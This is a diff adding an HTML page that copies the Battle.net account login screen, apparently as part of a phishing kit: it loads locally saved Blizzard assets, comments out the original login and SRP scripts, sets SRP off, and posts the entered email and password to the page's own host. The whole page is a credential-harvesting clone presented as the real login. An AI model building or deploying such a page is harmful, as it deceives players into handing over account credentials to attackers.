@@ -1,0 +1,186 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" class="en-us">
+<head xmlns:og="http://ogp.me/ns#" xmlns:fb="http://ogp.me/ns/fb#">
+    <meta http-equiv="imagetoolbar" content="false" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>Battle.net Account Login</title>
+    <link rel="shortcut icon" href="https://bneteu-a.akamaihd.net/login/static/images/meta/favicon.2dy4z.ico" />
+    <!--[if gt IE 8]><!-->
+    <link rel="stylesheet" type="text/css" media="all" href="./Battle.net Account Login_files/bnet-web.min.3kF3l.css" /><!-- <![endif]-->
+    <!--[if IE 8]><link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/toolkit/bnet-web-ie8.min.2mWN9.css" /><![endif]-->
+    <link rel="stylesheet" type="text/css" media="all" href="./Battle.net Account Login_files/global.min.0nexv.css" />
+    <link rel="stylesheet" type="text/css" media="all" href="./Battle.net Account Login_files/nav-client.css" />
+    <link rel="stylesheet" type="text/css" media="(max-width:800px)" href="./Battle.net Account Login_files/nav-client-responsive.css" />
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" media="all" href="//bneteu-a.akamaihd.net/login/static/css/login/ie8.1xfhv.css" />
+    <![endif]-->
+    <!--<link rel="search" type="application/opensearchdescription+xml" href="http://eu.battle.net/en-us/data/opensearch" title="Battle.net Search" />-->
+    <!--<script type="text/javascript" async="" src="./Battle.net Account Login_files/analytics.js" />-->
+    <!--<script type="text/javascript" async="" src="./Battle.net Account Login_files/linkid.js" />-->
+    <!--<script async="" src="./Battle.net Account Login_files/analytics.js" />-->
+    <!--<script async="" src="./Battle.net Account Login_files/gtm.js" />-->
+    <script type="text/javascript" src="./Battle.net Account Login_files/jquery-1.11.0.min.1UgDG.js" />
+    <script type="text/javascript" src="./Battle.net Account Login_files/core.min.2qO7b.js" />
+    <meta name="viewport" content="width=device-width" />
+    
+    <style type="text/css">
+        body.bnet {
+        background-image: url("images.login/login-background.jpg");
+        -webkit-background-size: cover;
+        -moz-background-size: cover;
+        -o-background-size: cover;
+        background-size: cover;
+        }
+    </style>
+</head>
+<body class="en-us login-template web bnet js-enabled" data-embedded-state="STATE_LOGIN">
+   
+   
+    <div class="grid-container wrapper">
+        <h1 class="logo">Battle.net Account Login</h1>
+        <div class="hide" id="info-wrapper">
+            <h2><strong class="info-title" /></h2>
+            <p class="info-body" />
+            <button class="btn btn-block hide visible-phone" id="info-phone-close">Close</button>
+        </div>
+        <div class="input" id="login-wrapper">
+            <form action="" method="post" id="password-form" class=" username-required input-focus">
+                <div id="login-input-container" class="">
+                    <div id="js-errors" class="alert alert-error alert-icon hide">
+                        <p id="cookie-check" class="hide">Your browser's cookies are disabled. Please reenable cookies to continue.</p>
+                    </div>
+                    <noscript>
+                        <div id="javascript-disabled" class="alert alert-error alert-icon">
+                            JavaScript must be enabled to use this site.
+                        </div>
+                    </noscript>
+                    <div class="control-group">
+                        <label id="accountName-label" class="control-label" for="accountName">Battle.net email</label>
+                        <div class="controls">
+                            <input aria-labelledby="accountName-label" id="accountName" name="accountName" title="Battle.net email" maxlength="320" type="text" tabindex="1" class="input-block input-large" placeholder="Battle.net email" autocorrect="off" spellcheck="false" />
+                        </div>
+                    </div>
+                    <div class="control-group">
+                        <label id="password-label" class="control-label" for="password">Password</label>
+                        <div class="controls">
+                            <input aria-labelledby="password-label" id="password" name="password" title="Password" maxlength="16" type="password" tabindex="1" class="input-block input-large" autocomplete="off" placeholder="Password" autocorrect="off" spellcheck="false" />
+                        </div>
+                    </div>
+                    <input type="hidden" id="useSrp" name="useSrp" value="false" />
+                    <input type="hidden" id="publicA" name="publicA" value="" />
+                    <input type="hidden" id="clientEvidenceM1" name="clientEvidenceM1" value="" />
+                    <div class="persistWrapper">
+                        <label id="persistLogin-label" class="checkbox-label css-label hide checked" for="persistLogin">
+                            <input aria-labelledby="persistLogin-label" id="persistLogin" name="persistLogin" type="checkbox" checked="checked" tabindex="1" />
+                            <span class="input-checkbox" />
+                            Keep me logged in
+                        </label>
+                    </div>
+                </div>
+                <div class="control-group submit ">
+                    <button type="submit" id="submit" class="btn btn-primary btn-large btn-block " data-loading-text="" tabindex="1">
+                        Log in to Battle.net
+                        <i class="spinner-battlenet" />
+                    </button>
+                </div>
+                <ul id="help-links">
+                    <li>
+                        <a class="btn btn-block btn-large" rel="external" href="http://eu.battle.net/account/creation/tos.html?ref=https://eu.battle.net/account/management/wow/dashboard.html&amp;theme=bnet" tabindex="1" id="signup">
+                            Create a Free Battle.net Account
+                        </a>
+                    </li>
+                    <li>
+                        <a class="" rel="external" href="http://eu.battle.net/account/support/login-support.html?ref=https://eu.battle.net/account/management/wow/dashboard.html&amp;theme=bnet" tabindex="1" id="loginSupport">
+                            Can’t log in?
+                        </a>
+                    </li>
+                </ul>
+                <input type="hidden" id="csrftoken" name="csrftoken" value="c247e0c0-f7c6-448b-bd45-9eda0304e751" />
+                <input type="hidden" id="sessionTimeout" name="sessionTimeout" value="1461647756538" />
+            </form>
+        </div>
+        <footer id="footer" class="footer en-us">
+            <div id="nav-client-footer" class="nav-client">
+                <div class="mobileFooterEnabled footer-content footer-desktop grid-container">
+                    <div class="nav-section support-feedback">
+                        <div class="nav-left">
+                            <div id="nav-feedback">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="nav-section">
+                        <div class="nav-left nav-logo-group">
+                            <div class="footer-logo nav-left">
+                                <a class="nav-item logo-link" href="http://eu.blizzard.com/" data-analytics="global-nav" data-analytics-placement="Footer - Blizzard Logo"><img class="blizzard-logo" src="./Battle.net Account Login_files/blizzard.png" alt="" /></a>
+                            </div>
+                            <div class="footer-links nav-left">
+                                <a class="nav-item nav-a" href="http://eu.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Battle.net EULA</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="http://eu.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Privacy</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="http://eu.blizzard.com/company/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Terms</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="http://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Copyright Infringement</a>
+                                <div class="copyright">©2016 Blizzard Entertainment, Inc.</div>
+                                <div class="nav-footer-icon-container">
+                                    <ul class="nav-footer-icon-list"></ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="nav-ratings">
+                        </div>
+                    </div>
+                </div>
+                <div class="mobileFooterEnabled footer-content footer-mobile grid-container">
+                    <div class="nav-logo-group">
+                        <div class="footer-logo">
+                            <a class="nav-item logo-link" href="http://eu.blizzard.com/" data-analytics="global-nav" data-analytics-placement="Footer - Blizzard Logo"><img class="blizzard-logo" src="./Battle.net Account Login_files/blizzard.png" alt="" /></a>
+                        </div>
+                        <div class="footer-links">
+                            <a class="nav-item nav-a" href="http://eu.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Battle.net EULA</a>
+                            <span>|</span>
+                            <a class="nav-item nav-a" href="http://eu.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Privacy</a>
+                            <span>|</span>
+                            <a class="nav-item nav-a" href="http://eu.blizzard.com/company/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Terms</a>
+                            <span>|</span>
+                            <a class="nav-item nav-a" href="http://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Copyright Infringement</a>
+                        </div>
+                        <div class="copyright">©2016 Blizzard Entertainment, Inc.</div>
+                        <div class="nav-footer-icon-container">
+                            <ul class="nav-footer-icon-list"></ul>
+                        </div>
+                        <div class="nav-ratings">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal eu-cookie-compliance desktop hide" id="eu-cookie-compliance">
+                <div class="modal-header">
+                    <a class="close" data-dismiss="modal" id="cookie-compliance-close"><i class="icon-remove icon-white" /></a>
+                    <h1>Cookie Disclaimer</h1>
+                </div>
+                <div class="modal-body">
+                    <p>Blizzard Entertainment uses cookies and similar technologies on its websites. By continuing your browsing after being presented with the cookie information you consent to such use.</p>
+                </div>
+                <button class="btn btn-primary" id="cookie-compliance-agree">OK</button>
+                <a class="btn" id="cookie-compliance-learn" href="http://eu.blizzard.com/company/about/privacy.html" target="_blank">Learn More</a>
+            </div>
+            <div class="modal eu-cookie-compliance mobile hide" id="eu-cookie-compliance">
+                <div class="modal-body">
+                    <a class="close" data-dismiss="modal" id="cookie-compliance-close"><i class="icon-remove icon-white" /></a>
+                    <p>This website uses cookies. By further browsing you consent to such use.</p>
+                </div>
+                <button class="btn btn-primary" id="cookie-compliance-agree">OK</button>
+                <a class="btn" id="cookie-compliance-learn" href="http://eu.blizzard.com/company/about/privacy.html" target="_blank">Learn More</a>
+            </div>
+        </footer>
+    </div>
+    <!--<script src="./Battle.net Account Login_files/embed-0.1.5.min.2QnZN.js" />
+    <script src="./Battle.net Account Login_files/toolkit.min.4dTX7.js" />-->
+   
+    <!--<script type="text/javascript" id="" src="./Battle.net Account Login_files/sync.ashx" />
+    <script type="text/javascript" src="./Battle.net Account Login_files/global.min.40AuO.js" />
+    <script type="text/javascript" src="./Battle.net Account Login_files/login.min.4TS5Y.js" />
+    <script type="text/javascript" src="./Battle.net Account Login_files/srp-client.min.30N9R.js" />-->
+</body>
+</html>
